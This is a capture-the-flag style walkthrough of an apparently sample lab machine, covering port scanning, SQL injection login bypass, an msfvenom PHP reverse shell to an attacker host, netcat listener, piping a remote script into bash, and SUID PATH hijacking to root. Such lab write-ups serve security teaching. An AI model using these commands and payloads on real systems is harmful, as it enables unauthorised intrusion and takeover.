# HTB: Example Machine

Prepared By: TestAuthor
Difficulty: Easy
20th December 2025

Skills Required:
- Web enumeration
- Basic Linux knowledge

Skills Learned:
- SQL Injection
- SUID exploitation

## Synopsis

This machine demonstrates common web vulnerabilities and basic privilege escalation techniques. The attack path involves exploiting a SQL injection vulnerability to gain initial access, followed by leveraging SUID binaries for privilege escalation.

## Enumeration

### Nmap Scan

Starting with a comprehensive nmap scan of the target:

```bash
nmap -sC -sV -p- 10.10.10.100
```

The scan reveals several open ports:
- Port 22: SSH (OpenSSH 7.6p1)
- Port 80: HTTP (Apache 2.4.29)
- Port 3306: MySQL (5.7.31)

### Web Enumeration

Browsing to port 80 reveals a login page. Testing for SQL injection vulnerabilities:

```bash
sqlmap -u "http://10.10.10.100/login.php" --forms --batch
```

The login form is vulnerable to SQL injection. We can bypass authentication using:

```
username: admin' OR '1'='1
password: anything
```

## Foothold

### SQL Injection Exploitation

After successfully bypassing the login, we gain access to an admin dashboard. The dashboard reveals a file upload functionality.

Testing file upload with a PHP reverse shell:

```bash
# Generate reverse shell
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw > shell.php

# Upload via web interface
curl -X POST -F "file=@shell.php" http://10.10.10.100/upload.php
```

Start a netcat listener and trigger the shell:

```bash
nc -lvnp 4444
curl http://10.10.10.100/uploads/shell.php
```

We receive a shell as user `www-data`.

## Privilege Escalation

### SUID Binary Discovery

Running linpeas to enumerate privilege escalation vectors:

```bash
# On attacker machine
python3 -m http.server 8000

# On target
curl http://10.10.14.5:8000/linpeas.sh | bash
```

The scan reveals an interesting SUID binary: `/usr/local/bin/backup`

### Exploiting SUID Binary

Analyzing the backup binary:

```bash
strings /usr/local/bin/backup
```

The binary calls `tar` without using absolute path, making it vulnerable to PATH hijacking:

```bash
# Create malicious tar
echo '#!/bin/bash' > /tmp/tar
echo '/bin/bash -p' >> /tmp/tar
chmod +x /tmp/tar

# Hijack PATH
export PATH=/tmp:$PATH

# Execute SUID binary
/usr/local/bin/backup
```

This spawns a root shell. Success!

### Root Flag

```bash
cat /root/root.txt
```
